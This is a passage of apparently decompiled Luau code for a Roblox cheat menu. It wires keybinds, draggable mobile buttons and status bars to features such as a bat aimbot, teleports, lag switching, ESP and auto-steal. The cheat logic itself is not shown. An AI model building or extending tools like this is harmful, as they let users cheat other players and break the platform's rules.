									{ "Bat Aimbot", "BAT_AIMBOT" },
									{ "Auto Right", "AUTO_RIGHT" },
									{ "TP Down", "TP_DOWN" },
									{ "Carry Speed", "CARRY_SPD" },
									{ "Lagger Normal", "LAGGER_NORMAL" },
									{ "Lagger Carry", "LAGGER_CARRY" },
									{ "Bat TP", "ANTI_BAT" },
									{ "Insta Reset", "INSTA_RESET" },
								}) do
									fn52(v88[1], v88[2], i)
								end

								local flag23 = false
								local tween_ = nil

								local function fn53(arg)
									flag23 = arg == true

									if tween_ then
										tween_:Cancel()
									end

									if flag23 then
										frame19.Visible = true
										textButton10.Text = "▲"
										tween_ = TweenService:Create(
											frame19,
											TweenInfo.new(0.24, Enum.EasingStyle.Quint, Enum.EasingDirection.Out),
											{ Size = UDim2.new(1, -4, 0, 466) }
										)
										tween_:Play()
									else
										textButton10.Text = "▼"
										tween_ = TweenService:Create(
											frame19,
											TweenInfo.new(0.2, Enum.EasingStyle.Quint, Enum.EasingDirection.In),
											{ Size = UDim2.new(1, -4, 0, 0) }
										)

										tween_.Completed:Connect(function()
											if not flag23 then
												frame19.Visible = false
											end
										end)

										tween_:Play()
									end
								end

								textButton10.MouseButton1Click:Connect(function()
									fn53(not flag23)
								end)

								addToggleRow(settings, "Lock Side Buttons", true, 15, nil, function(arg)
									_phantomSideBtnLocked = arg
								end)

								addActionRow(settings, "Reset Side Buttons", nil, function()
									mobileButtonsSize = 45

									if _phantomMobFrame then
										_phantomMobFrame.Size = UDim2.new(0, 106, 0, 253)
										_phantomMobFrame.Position = UDim2.new(1, -116, 0.5, -156.5)
									end

									for k, v88 in pairs({
										DROP_BR = { col = 0, row = 0 },
										AUTO_LEFT = { col = 1, row = 0 },
										BAT_AIMBOT = { col = 0, row = 1 },
										AUTO_RIGHT = { col = 1, row = 1 },
										TP_DOWN = { col = 0, row = 2 },
										CARRY_SPD = { col = 1, row = 2 },
										LAGGER_NORMAL = { col = 0, row = 3 },
										LAGGER_CARRY = { col = 1, row = 3 },
										ANTI_BAT = { col = 0, row = 4 },
										INSTA_RESET = { col = 1, row = 4 },
									}) do
										local v89 = _phantomBtnFrames[k]

										if v89 then
											v89.Position = UDim2.new(0, 6 + v88.col * 49, 0, 6 + v88.row * 49)
											v89.Size = UDim2.new(0, 45, 0, 45)
											local textLabel9 = v89:FindFirstChildWhichIsA("TextLabel")

											if textLabel9 then
												textLabel9.TextSize = 9
											end
										end
									end

									_G._phantomBtnPos = {}
									_savedBtnPositions = {}

									pcall(function()
										if writefile then
											writefile(MOB_POS_FILE, HS:JSONEncode({}))
										end
									end)

									saveConfig()
									notify("Side Buttons", "Reset to default", "activated", 2)
								end, 16)
							end

							fn43()

							UIS.InputBegan:Connect(function(input, gameProcessed)
								if gameProcessed then
									return
								end

								if UIS:GetFocusedTextBox() then
									return
								end

								if input.KeyCode == Keys.guiHide then
									if GuiRefs.outer then
										if not GuiRefs.outer.Visible or GuiRefs.guiMinimized then
											pcall(function()
												GuiRefs.showGui()
											end)
										else
											pcall(function()
												GuiRefs.hideGui()
											end)
										end
									end
								elseif input.KeyCode == Keys.speed then
									speedToggleAction()
								elseif input.KeyCode == Keys.carryMode then
									speedToggleAction()
								elseif input.KeyCode == Keys.laggerToggle then
									toggleLaggerMode()
									saveConfig()
								elseif input.KeyCode == Keys.laggerCarryToggle then
									toggleLaggerCarryMode()
									saveConfig()
									notify(
										"Lagger Carry",
										laggerCarryToggled and "Activated" or "Deactivated",
										laggerCarryToggled and "activated" or "deactivated",
										2.3
									)
								elseif input.KeyCode == Keys.circle then
									autoBatEnabled = not autoBatEnabled

									if autoBatEnabled then
										if State.batV2Toggled then
											State.batV2Toggled = false
											stopBatTP()

											if svBatV2 then
												svBatV2(false)
											end
										end

										startBatAimbot()
									else
										stopBatAimbot()
									end

									saveConfig()
									notify(
										"Bat Aimbot",
										autoBatEnabled and "Activated" or "Deactivated",
										autoBatEnabled and "activated" or "deactivated",
										2.3
									)
								elseif input.KeyCode == Keys.antiBatBypass then
									State.batV2Toggled = not State.batV2Toggled

									if State.batV2Toggled then
										if autoBatEnabled then
											autoBatEnabled = false
											stopBatAimbot()

											if autoBatSetVisual then
												autoBatSetVisual(false)
											end
										end

										pcall(startBatTP)
									else
										stopBatTP()
									end

									if svBatV2 then
										svBatV2(State.batV2Toggled)
									end

									saveConfig()
									notify(
										"Bat TP",
										State.batV2Toggled and "Activated" or "Deactivated",
										State.batV2Toggled and "activated" or "deactivated",
										2.3
									)
								elseif input.KeyCode == Keys.dropBrainrot then
									notify("Drop Brainrot", "Triggered", "warn", 2.2)
									runDrop()
								elseif input.KeyCode == Keys.tpDown then
									notify("TP Down", "Triggered", "warn", 2.2)
									runTPFloor()
								elseif input.KeyCode == Keys.instaReset then
									notify("Insta Reset", "Triggered", "warn", 2.2)
									cursedInstaReset()
								elseif input.KeyCode == Keys.autoLeft then
									if autoLeftEnabled then
										autoLeftEnabled = false
										stopAutoLeft()
									else
										if autoRightEnabled then
											autoRightEnabled = false
											stopAutoRight()

											if autoRightSetVisual then
												autoRightSetVisual(false)
											end

											if mobBtnRefs.autoRight then
												mobBtnRefs.autoRight(false)
											end
										end

										if autoBatEnabled then
											stopBatAimbot()

											if autoBatSetVisual then
												autoBatSetVisual(false)
											end

											if mobBtnRefs.autoBat then
												mobBtnRefs.autoBat(false)
											end
										end

										autoLeftEnabled = true
										startAutoLeft()
									end

									if autoLeftSetVisual then
										autoLeftSetVisual(autoLeftEnabled)
									end

									if mobBtnRefs.autoLeft then
										mobBtnRefs.autoLeft(autoLeftEnabled)
									end

									if toggleRefs.autoLeft then
										toggleRefs.autoLeft(autoLeftEnabled)
									end

									if setAL then
										setAL(autoLeftEnabled)
									end

									notify(
										"Auto Left",
										autoLeftEnabled and "Activated" or "Deactivated",
										autoLeftEnabled and "activated" or "deactivated",
										2.3
									)
								elseif input.KeyCode == Keys.autoRight then
									if autoRightEnabled then
										autoRightEnabled = false
										stopAutoRight()
									else
										if autoLeftEnabled then
											autoLeftEnabled = false
											stopAutoLeft()

											if autoLeftSetVisual then
												autoLeftSetVisual(false)
											end

											if mobBtnRefs.autoLeft then
												mobBtnRefs.autoLeft(false)
											end
										end

										if autoBatEnabled then
											stopBatAimbot()

											if autoBatSetVisual then
												autoBatSetVisual(false)
											end

											if mobBtnRefs.autoBat then
												mobBtnRefs.autoBat(false)
											end
										end

										autoRightEnabled = true
										startAutoRight()
									end

									if autoRightSetVisual then
										autoRightSetVisual(autoRightEnabled)
									end

									if mobBtnRefs.autoRight then
										mobBtnRefs.autoRight(autoRightEnabled)
									end

									if toggleRefs.autoRight then
										toggleRefs.autoRight(autoRightEnabled)
									end

									if setAR then
										setAR(autoRightEnabled)
									end

									notify(
										"Auto Right",
										autoRightEnabled and "Activated" or "Deactivated",
										autoRightEnabled and "activated" or "deactivated",
										2.3
									)
								end
							end)

							if infJumpEnabled then
								applyInfJumpMode()
							end

							if antiRagdollEnabled then
								startAntiRagdoll()
							end

							if antiDieEnabled then
								startAntiDie()
							end

							if animEnabled then
								startAnimToggle()
							end

							if tryardAnimEnabled then
								task.spawn(function()
									task.wait(1)
									pcall(startTryardAnim)
								end)
							end

							task.spawn(function()
								task.wait(1)

								if tryardAnimEnabled then
									walkAnimationsEnabled = false
								else
									pcall(applyWalkAnimationPack, selectedWalkAnimation)
								end
							end)

							if selfEspEnabled or selfBoxEspEnabled then
								task.spawn(function()
									task.wait(1)
									pcall(applySelfESP, selfEspEnabled)
								end)
							end

							if saturationEnabled then
								applySaturation(true)
							end

							if espEnabled or espShowHighlight or espShowTracer then
								task.spawn(function()
									task.wait(1)
									pcall(enableESP)
								end)
							end

							applyBackgroundImage(backgroundIndex)
							CandyApplyCustomSky(currentSkyTheme)
							local color = Color3.fromRGB(0, 0, 0)

							local function fn44(arg)
								if
									(arg:IsA("TextLabel") or arg:IsA("TextButton"))
									and arg.TextStrokeTransparency >= 0.98
								then
									arg.TextStrokeColor3 = color
									arg.TextStrokeTransparency = 0.45
								end
							end

							task.defer(function()
								if not GuiRefs.hub then
									return
								end

								for _, descendant in ipairs(GuiRefs.hub:GetDescendants()) do
									pcall(fn44, descendant)
								end

								GuiRefs.hub.DescendantAdded:Connect(function(descendant)
									task.defer(function()
										pcall(fn44, descendant)
									end)
								end)
							end)
						end

						fn36()
					end
				end

				Gui = GuiRefs.hub
				_phantomMobFrame = nil
				_phantomBtnFrames = {}
				_phantomSideBtnLocked = true

				do
					local n35 = mobileButtonsSize and mobileButtonsSize >= 20 and mobileButtonsSize or 45
					local color = Color3.fromRGB(0, 0, 0)
					Color3.fromRGB(255, 255, 255)
					Color3.fromRGB(255, 255, 255)
					Color3.fromRGB(255, 255, 255)
					local n36 = n35 * 2 + 4
					local n37 = n35 * 5 + 16
					local frame = Instance.new("Frame", Gui)
					frame.Name = "PhantomMobileButtons"
					frame.Size = UDim2.new(0, n36 + 12, 0, n37 + 12)
					local frame2 = _G._phantomBtnPos and _G._phantomBtnPos.__frame
						or _savedBtnPositions and _savedBtnPositions.__frame

					if frame2 then
						frame.Position = UDim2.new(frame2.xs or 1, frame2.xo or 0, frame2.ys or 0.5, frame2.yo or 0)
					else
						frame.Position = UDim2.new(1, -(n36 + 22), 0.5, -(n37 / 2 + 36))
					end

					frame.BackgroundTransparency = 1
					frame.BorderSizePixel = 0
					frame.Active = false
					frame.ZIndex = 100
					mobGuiRef = frame
					_phantomMobFrame = frame

					fn35 = function(text, arg, arg2, arg3, arg4, arg5)
						local n38 = 50 + arg * (n35 + 4)
						local n39 = 6 + arg2 * (n35 + 4)
						local phantomBtnPos = arg5
							and (
								_G._phantomBtnPos and _G._phantomBtnPos[arg5]
								or _savedBtnPositions and _savedBtnPositions[arg5]
							)
						local instance = Instance.new("Frame", frame)
						instance.Size = UDim2.new(0, n35, 0, n35)

						if phantomBtnPos then
							instance.Position = UDim2.new(
								phantomBtnPos.xs or 0,
								phantomBtnPos.xo or 0,
								phantomBtnPos.ys or 0,
								phantomBtnPos.yo or 0
							)
						else
							instance.Position = UDim2.new(0, n38, 0, n39)
						end

						instance.BackgroundColor3 = color
						instance.BackgroundTransparency = 0
						instance.BorderSizePixel = 0
						instance.Active = true
						instance.ZIndex = 102
						instance.ClipsDescendants = true
						guiCorner(instance, 9)
						local v86 = guiStroke(instance, Color3.fromRGB(0, 0, 0), 1.4)
						v86.Transparency = 0.08
						local imageLabel = Instance.new("ImageLabel", instance)
						imageLabel.Name = "BtnBgWallpaper"
						imageLabel.Size = UDim2.fromScale(1, 1)
						imageLabel.BackgroundTransparency = 1
						imageLabel.ScaleType = Enum.ScaleType.Crop
						imageLabel.ZIndex = 102.1
						imageLabel.Visible = sideBtnBgIndex > 0
						guiCorner(imageLabel, 9)
						table.insert(sideBtnBgImageRefs, imageLabel)

						if sideBtnBgIndex > 0 then
							setImage(imageLabel, BG_IMAGES[sideBtnBgIndex])
						end

						local instance2 = Instance.new("Frame", instance)
						instance2.Name = "BtnDarkOverlay"
						instance2.Size = UDim2.fromScale(1, 1)
						instance2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
						instance2.BackgroundTransparency = 0.68
						instance2.BorderSizePixel = 0
						instance2.ZIndex = 102.2
						instance2.Visible = sideBtnBgIndex > 0
						guiCorner(instance2, 9)
						table.insert(sideBtnDarkOverlayRefs, instance2)
						local textLabel = Instance.new("TextLabel", instance)
						textLabel.Size = UDim2.fromScale(1, 1)
						textLabel.BackgroundTransparency = 1
						textLabel.Text = text
						textLabel.TextColor3 = Color3.fromRGB(220, 220, 220)
						textLabel.Font = Enum.Font.GothamBold
						textLabel.TextSize = math.max(7, math.floor(n35 / 5))
						textLabel.TextWrapped = true
						textLabel.LineHeight = 1.15
						textLabel.ZIndex = 103
						local instance3 = Instance.new("UIGradient", textLabel)
						local colorSequence = ColorSequence.new
						local tbl17 = {}
						local v87 = ColorSequenceKeypoint.new(0, Color3.fromRGB(210, 210, 210))
						local v88 = ColorSequenceKeypoint.new(0.36, Color3.fromRGB(220, 220, 220))
						local v89 = ColorSequenceKeypoint.new(0.44, Color3.fromRGB(245, 245, 245))
						local v90 = ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 255, 255))
						local v91 = ColorSequenceKeypoint.new(0.56, Color3.fromRGB(245, 245, 245))
						local v92 = ColorSequenceKeypoint.new(0.64, Color3.fromRGB(220, 220, 220))
						tbl17[1] = v87
						tbl17[2] = v88
						tbl17[3] = v89
						tbl17[4] = v90
						tbl17[5] = v91
						tbl17[6] = v92

						do
							local values = table.pack(ColorSequenceKeypoint.new(1, Color3.fromRGB(210, 210, 210)))
							table.move(values, 1, values.n, 7, tbl17)
						end

						instance3.Color = colorSequence(tbl17)

						task.spawn(function()
							while textLabel and textLabel.Parent do
								instance3.Offset = Vector2.new(-1, 0)
								local tween_ = TweenService:Create(
									instance3,
									TweenInfo.new(1.8, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut),
									{ Offset = Vector2.new(1, 0) }
								)
								tween_:Play()
								tween_.Completed:Wait()
								task.wait(0.1)
							end
						end)

						local textButton = Instance.new("TextButton", instance)
						textButton.Size = UDim2.fromScale(1, 1)
						textButton.BackgroundTransparency = 1
						textButton.Text = ""
						textButton.ZIndex = 104
						textButton.AutoButtonColor = false

						if arg5 then
							_phantomBtnFrames[arg5] = instance
							instance.Name = "SBtn_" .. arg5
						end

						local flag18 = false

						local function fn36(arg6)
							flag18 = arg6

							tw(v86, {
								Color = arg6 and Color3.fromRGB(255, 255, 255) or Color3.fromRGB(0, 0, 0),
								Thickness = arg6 and 2 or 1.4,
								Transparency = arg6 and 0 or 0.08,
							}, TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.Out))

							tw(
								instance,
								{ BackgroundColor3 = arg6 and Color3.fromRGB(58, 58, 58) or color },
								TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
							)

							if instance2 then
								tw(
									instance2,
									{ BackgroundTransparency = arg6 and 0.48 or 0.68 },
									TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
								)
							end

							if textLabel then
								tw(textLabel, {
									TextColor3 = arg6 and Color3.fromRGB(255, 255, 255)
										or Color3.fromRGB(220, 220, 220),
								}, TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.Out))
							end
						end

						local position = nil
						local position2 = nil
						local flag19 = false

						textButton.InputBegan:Connect(function(input)
							if _phantomSideBtnLocked then
								return
							end

							if
								input.UserInputType == Enum.UserInputType.MouseButton1
								or input.UserInputType == Enum.UserInputType.Touch
							then
								position = input.Position
								position2 = instance.Position
								flag19 = false
							end
						end)

						UIS.InputChanged:Connect(function(input)
							if _phantomSideBtnLocked or not position then
								return
							end

							if
								input.UserInputType == Enum.UserInputType.MouseMovement
								or input.UserInputType == Enum.UserInputType.Touch
							then
								local n40 = input.Position - position

								if math.abs(n40.X) + math.abs(n40.Y) > 6 then
									flag19 = true
									instance.Position = UDim2.new(
										position2.X.Scale,
										position2.X.Offset + n40.X,
										position2.Y.Scale,
										position2.Y.Offset + n40.Y
									)

									if sideBtnBgIndex > 0 then
										fn30()
									end
								end
							end
						end)

						UIS.InputEnded:Connect(function(input)
							if
								input.UserInputType == Enum.UserInputType.MouseButton1
								or input.UserInputType == Enum.UserInputType.Touch
							then
								if flag19 then
									if arg5 then
										local tbl18 = {
											xs = instance.Position.X.Scale,
											xo = instance.Position.X.Offset,
											ys = instance.Position.Y.Scale,
											yo = instance.Position.Y.Offset,
										}

										_G._phantomBtnPos = _G._phantomBtnPos or {}
										_G._phantomBtnPos[arg5] = tbl18
										_savedBtnPositions = _savedBtnPositions or {}
										_savedBtnPositions[arg5] = tbl18
									end

									pcall(saveBtnPositions)
									pcall(saveConfig)

									if 0 < sideBtnBgIndex then
										fn30()
									end
								end

								position = nil
								flag19 = false
							end
						end)

						textButton.MouseButton1Click:Connect(function()
							if flag19 then
								return
							end
							playClickSound()

							if arg3 then
								flag18 = not flag18
								fn36(flag18)

								if arg4 then
									arg4(flag18)
								end
							else
								fn36(true)

								if arg4 then
									arg4()
								end

								task.delay(0.28, function()
									if textButton and textButton.Parent then
										fn36(false)
									end
								end)
							end
						end)

						return instance, fn36
					end
				end
			end

			do
				do
					fn35("DROP\nBR", 0, 0, false, function()
						if not State.dropEnabled then
							runDrop()
						end
					end, "DROP_BR")

					do
						local v86, v87 = fn35("AUTO\nLEFT", 1, 0, true, function(arg)
							autoLeftEnabled = arg

							if autoLeftSetVisual then
								autoLeftSetVisual(arg)
							end

							if arg then
								if autoRightEnabled then
									autoRightEnabled = false
									stopAutoRight()

									if autoRightSetVisual then
										autoRightSetVisual(false)
									end

									if mobBtnRefs.autoRight then
										mobBtnRefs.autoRight(false)
									end
								end

								if autoBatEnabled then
									autoBatEnabled = false
									stopBatAimbot()

									if autoBatSetVisual then
										autoBatSetVisual(false)
									end

									if mobBtnRefs.autoBat then
										mobBtnRefs.autoBat(false)
									end
								end

								startAutoLeft()
							else
								stopAutoLeft()
							end

							saveConfig()
						end, "AUTO_LEFT")

						mobBtnRefs.autoLeft = v87
					end
				end

				do
					local v86, v87 = fn35("BAT\nAIMBOT", 0, 1, true, function(arg)
						autoBatEnabled = arg

						if autoBatSetVisual then
							autoBatSetVisual(arg)
						end

						if arg then
							if autoLeftEnabled then
								autoLeftEnabled = false
								stopAutoLeft()

								if autoLeftSetVisual then
									autoLeftSetVisual(false)
								end

								if mobBtnRefs.autoLeft then
									mobBtnRefs.autoLeft(false)
								end
							end

							if autoRightEnabled then
								autoRightEnabled = false
								stopAutoRight()

								if autoRightSetVisual then
									autoRightSetVisual(false)
								end

								if mobBtnRefs.autoRight then
									mobBtnRefs.autoRight(false)
								end
							end

							startBatAimbot()
						else
							stopBatAimbot()
						end

						saveConfig()
					end, "BAT_AIMBOT")

					mobBtnRefs.autoBat = v87
				end
			end

			do
				local v86, v87 = fn35("AUTO\nRIGHT", 1, 1, true, function(arg)
					autoRightEnabled = arg

					if autoRightSetVisual then
						autoRightSetVisual(arg)
					end

					if arg then
						if autoLeftEnabled then
							autoLeftEnabled = false
							stopAutoLeft()

							if autoLeftSetVisual then
								autoLeftSetVisual(false)
							end

							if mobBtnRefs.autoLeft then
								mobBtnRefs.autoLeft(false)
							end
						end

						if autoBatEnabled then
							autoBatEnabled = false
							stopBatAimbot()

							if autoBatSetVisual then
								autoBatSetVisual(false)
							end

							if mobBtnRefs.autoBat then
								mobBtnRefs.autoBat(false)
							end
						end

						startAutoRight()
					else
						stopAutoRight()
					end

					saveConfig()
				end, "AUTO_RIGHT")

				mobBtnRefs.autoRight = v87
			end

			fn35("TP\nDOWN", 0, 2, false, function()
				runTPFloor()
			end, "TP_DOWN")

			do
				local v86, v87 = fn35("CARRY\nSPD", 1, 2, true, function(arg)
					if arg then
						if laggerModeEnabled or laggerCarryToggled then
							toggleCarryMode()
						else
							carrySpeedActive = true
							speedMode = true
						end
					else
						carrySpeedActive = false
						speedMode = false
					end

					if carryModeSetVisual then
						carryModeSetVisual(carrySpeedActive)
					end

					if toggleRefs and toggleRefs.carryMode then
						toggleRefs.carryMode(carrySpeedActive)
					end

					if toggleRefs and toggleRefs.laggerCarryMode then
						toggleRefs.laggerCarryMode(laggerCarryToggled)
					end

					refreshSpeedModeLabel()
					saveConfig()
				end, "CARRY_SPD")

				mobBtnRefs.carrySpeed = v87
			end
		end

		do
			do
				local v86, v87 = fn35("LAGGER\nNORMAL", 0, 3, true, function(arg)
					setLaggerModeEnabled(arg)

					if mobBtnRefs.laggerCarry then
						mobBtnRefs.laggerCarry(laggerCarryToggled)
					end

					if laggerModeSetVisual then
						laggerModeSetVisual(laggerModeEnabled)
					end

					if laggerCarryModeSetVisual then
						laggerCarryModeSetVisual(laggerCarryToggled)
					end

					saveConfig()
				end, "LAGGER_NORMAL")

				mobBtnRefs.lagger = v87
			end

			do
				local v86, v87 = fn35("LAGGER\nCARRY", 1, 3, true, function(arg)
					laggerCarryToggled = arg
					carrySpeedActive = false
					speedMode = false
					laggerPhase = laggerCarryToggled and 2 or laggerModeEnabled and 1 or 0
					refreshSpeedModeLabel()

					if laggerModeSetVisual then
						laggerModeSetVisual(laggerModeEnabled)
					end

					if laggerCarryModeSetVisual then
						laggerCarryModeSetVisual(laggerCarryToggled)
					end

					if toggleRefs and toggleRefs.laggerCarryMode then
						toggleRefs.laggerCarryMode(laggerCarryToggled)
					end

					if carryModeSetVisual then
						carryModeSetVisual(carrySpeedActive)
					end

					saveConfig()
				end, "LAGGER_CARRY")

				mobBtnRefs.laggerCarry = v87
			end

			do
				local v86, v87 = fn35("BAT\nTP", 0, 4, true, function(batV2Toggled)
					State.batV2Toggled = batV2Toggled

					if svBatV2 then
						svBatV2(batV2Toggled)
					end

					if batV2Toggled then
						if autoBatEnabled then
							autoBatEnabled = false
							stopBatAimbot()

							if autoBatSetVisual then
								autoBatSetVisual(false)
							end

							if mobBtnRefs.autoBat then
								mobBtnRefs.autoBat(false)
							end
						end

						pcall(startBatTP)
					else
						stopBatTP()
					end

					saveConfig()
				end, "ANTI_BAT")

				mobBtnRefs.antiBatBypass = v87
			end
		end

		fn35("INSTA\nRESET", 1, 4, false, function()
			cursedInstaReset()
		end, "INSTA_RESET")
	end

	task.defer(function()
		if mobBtnRefs.autoLeft then
			mobBtnRefs.autoLeft(autoLeftEnabled)
		end

		if mobBtnRefs.autoRight then
			mobBtnRefs.autoRight(autoRightEnabled)
		end

		if mobBtnRefs.autoBat then
			mobBtnRefs.autoBat(autoBatEnabled)
		end

		if mobBtnRefs.antiBatBypass then
			mobBtnRefs.antiBatBypass(State.batV2Toggled)
		end

		if mobBtnRefs.carrySpeed then
			mobBtnRefs.carrySpeed(carrySpeedActive)
		end

		if mobBtnRefs.lagger then
			mobBtnRefs.lagger(laggerModeEnabled)
		end

		if mobBtnRefs.laggerCarry then
			mobBtnRefs.laggerCarry(laggerModeEnabled and carrySpeedActive)
		end

		if sideBtnBgIndex > 0 then
			applySideButtonBgImage(sideBtnBgIndex)
		end

		for k, v86 in pairs(_phantomBtnFrames) do
			v86.Visible = not sideButtonsHidden or sideButtonVisibility[k] ~= true
		end
	end)

	task.spawn(function()
		task.wait(0)
		local phantomBtnPos = _G._phantomBtnPos or _savedBtnPositions or {}

		if not next(phantomBtnPos) then
			pcall(function()
				local data = HS:JSONDecode(readfile("NineDuelsV1configLOL1/Config.json"))

				if type(data) == "table" and type(data.btnPositions) == "table" then
					phantomBtnPos = data.btnPositions
				end
			end)
		end

		local frame = phantomBtnPos.__frame

		if frame and _phantomMobFrame then
			_phantomMobFrame.Position = UDim2.new(frame.xs or 1, frame.xo or 0, frame.ys or 0.5, frame.yo or 0)
		end

		for k, phantomBtnPo in pairs(phantomBtnPos) do
			if k ~= "__frame" then
				local v86 = _phantomBtnFrames[k]

				if v86 then
					v86.Position = UDim2.new(
						phantomBtnPo.xs or 0,
						phantomBtnPo.xo or 0,
						phantomBtnPo.ys or 0,
						phantomBtnPo.yo or 0
					)
				end
			end
		end
	end)

	GrabBar = Instance.new("Frame")
	GrabBar.Name = "GrabStatusBar"
	GrabBar.AnchorPoint = Vector2.new(0.5, 1)
	GrabBar.Position = UDim2.new(0.5, 0, 1, -12)
	GrabBar.Size = UDim2.fromOffset(240, 38)
	GrabBar.BackgroundColor3 = Color3.fromRGB(8, 8, 11)
	GrabBar.BackgroundTransparency = 0
	GrabBar.BorderSizePixel = 0
	GrabBar.Active = true
	GrabBar.ZIndex = 20
	GrabBar.Parent = nil
	GrabBar.Visible = false
	corner(GrabBar, 8)
	stroke(GrabBar, Color3.fromRGB(195, 35, 52), 1.2, 0)

	task.defer(function()
		if makeDraggable then
			pcall(makeDraggable, GrabBar)
		end
	end)

	grabPct = Instance.new("TextLabel")
	grabPct.Size = UDim2.new(1, -20, 0, 16)
	grabPct.Position = UDim2.fromOffset(10, 5)
	grabPct.BackgroundTransparency = 1
	grabPct.Text = "0%"
	grabPct.TextColor3 = Color3.fromRGB(115, 115, 115)
	grabPct.Font = Enum.Font.GothamBold
	grabPct.TextSize = 11
	grabPct.TextXAlignment = Enum.TextXAlignment.Left
	grabPct.ZIndex = 22
	grabPct.Parent = GrabBar

	do
		local uiGradient = Instance.new("UIGradient", grabPct)
		local colorSequence = ColorSequence.new
		local tbl17 = {}
		local v86 = ColorSequenceKeypoint.new(0, Color3.fromRGB(65, 65, 65))
		local v87 = ColorSequenceKeypoint.new(0.36, Color3.fromRGB(115, 115, 115))
		local v88 = ColorSequenceKeypoint.new(0.44, Color3.fromRGB(245, 245, 245))
		local v89 = ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 255, 255))
		local v90 = ColorSequenceKeypoint.new(0.56, Color3.fromRGB(245, 245, 245))
		local v91 = ColorSequenceKeypoint.new(0.64, Color3.fromRGB(115, 115, 115))
		tbl17[1] = v86
		tbl17[2] = v87
		tbl17[3] = v88
		tbl17[4] = v89
		tbl17[5] = v90
		tbl17[6] = v91

		do
			local values = table.pack(ColorSequenceKeypoint.new(1, Color3.fromRGB(65, 65, 65)))
			table.move(values, 1, values.n, 7, tbl17)
		end

		uiGradient.Color = colorSequence(tbl17)

		task.spawn(function()
			while grabPct and grabPct.Parent do
				uiGradient.Offset = Vector2.new(-1, 0)
				local tween_ = TweenService:Create(
					uiGradient,
					TweenInfo.new(1.8, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut),
					{ Offset = Vector2.new(1, 0) }
				)
				tween_:Play()
				tween_.Completed:Wait()
				task.wait(0.05)
			end
		end)
	end
end

do
	do
		do
			grabRadLbl = Instance.new("TextLabel")
			grabRadLbl.Size = UDim2.new(0, 110, 0, 16)
			grabRadLbl.Position = UDim2.new(1, -120, 0, 5)
			grabRadLbl.BackgroundTransparency = 1
			grabRadLbl.Text = "Radius: " .. Steal.StealRadius
			grabRadLbl.TextColor3 = Color3.fromRGB(115, 115, 115)
			grabRadLbl.Font = Enum.Font.GothamBold
			grabRadLbl.TextSize = 11
			grabRadLbl.TextXAlignment = Enum.TextXAlignment.Right
			grabRadLbl.ZIndex = 22
			grabRadLbl.Parent = GrabBar

			do
				local uiGradient = Instance.new("UIGradient", grabRadLbl)
				local colorSequence = ColorSequence.new
				local tbl17 = {}
				local v86 = ColorSequenceKeypoint.new(0, Color3.fromRGB(65, 65, 65))
				local v87 = ColorSequenceKeypoint.new(0.36, Color3.fromRGB(115, 115, 115))
				local v88 = ColorSequenceKeypoint.new(0.44, Color3.fromRGB(245, 245, 245))
				local v89 = ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 255, 255))
				local v90 = ColorSequenceKeypoint.new(0.56, Color3.fromRGB(245, 245, 245))
				local v91 = ColorSequenceKeypoint.new(0.64, Color3.fromRGB(115, 115, 115))
				tbl17[1] = v86
				tbl17[2] = v87
				tbl17[3] = v88
				tbl17[4] = v89
				tbl17[5] = v90
				tbl17[6] = v91

				do
					local values = table.pack(ColorSequenceKeypoint.new(1, Color3.fromRGB(65, 65, 65)))
					table.move(values, 1, values.n, 7, tbl17)
				end

				uiGradient.Color = colorSequence(tbl17)

				task.spawn(function()
					while grabRadLbl and grabRadLbl.Parent do
						uiGradient.Offset = Vector2.new(-1, 0)
						local tween_ = TweenService:Create(
							uiGradient,
							TweenInfo.new(1.8, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut),
							{ Offset = Vector2.new(1, 0) }
						)
						tween_:Play()
						tween_.Completed:Wait()
						task.wait(0.1)
					end
				end)
			end
		end

		grabBg = Instance.new("Frame")
		grabBg.Size = UDim2.new(1, -20, 0, 6)
		grabBg.Position = UDim2.fromOffset(10, 18)
		grabBg.BackgroundColor3 = Color3.fromRGB(48, 35, 62)
		grabBg.BorderSizePixel = 0
		grabBg.ZIndex = 21
		grabBg.Parent = GrabBar
		corner(grabBg, 4)
		grabFill = Instance.new("Frame")
		grabFill.Size = UDim2.new(0, 0, 1, 0)
		grabFill.BackgroundColor3 = Color3.fromRGB(115, 115, 115)
		grabFill.BorderSizePixel = 0
		grabFill.ZIndex = 22
		grabFill.Parent = grabBg
		corner(grabFill, 4)

		do
			local uiGradient = Instance.new("UIGradient", grabFill)
			local colorSequence = ColorSequence.new
			local tbl17 = {}
			local v86 = ColorSequenceKeypoint.new(0, Color3.fromRGB(65, 65, 65))
			local v87 = ColorSequenceKeypoint.new(0.36, Color3.fromRGB(115, 115, 115))
			local v88 = ColorSequenceKeypoint.new(0.44, Color3.fromRGB(245, 245, 245))
			local v89 = ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 255, 255))
			local v90 = ColorSequenceKeypoint.new(0.56, Color3.fromRGB(245, 245, 245))
			local v91 = ColorSequenceKeypoint.new(0.64, Color3.fromRGB(115, 115, 115))
			tbl17[1] = v86
			tbl17[2] = v87
			tbl17[3] = v88
			tbl17[4] = v89
			tbl17[5] = v90
			tbl17[6] = v91

			do
				local values = table.pack(ColorSequenceKeypoint.new(1, Color3.fromRGB(65, 65, 65)))
				table.move(values, 1, values.n, 7, tbl17)
			end

			uiGradient.Color = colorSequence(tbl17)

			task.spawn(function()
				while grabFill and grabFill.Parent do
					uiGradient.Offset = Vector2.new(-1, 0)
					local tween_ = TweenService:Create(
						uiGradient,
						TweenInfo.new(1, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut),
						{ Offset = Vector2.new(1, 0) }
					)
					tween_:Play()
					tween_.Completed:Wait()
					task.wait(0.05)
				end
			end)
		end
	end

	do
		do
			do
				task.spawn(function()
					while GrabBar and GrabBar.Parent do
						local autoStealEnabled = Steal.AutoStealEnabled and isStealing and stealStartTime
						local n32 = 0

						if autoStealEnabled then
							local v86 = stealStartTime
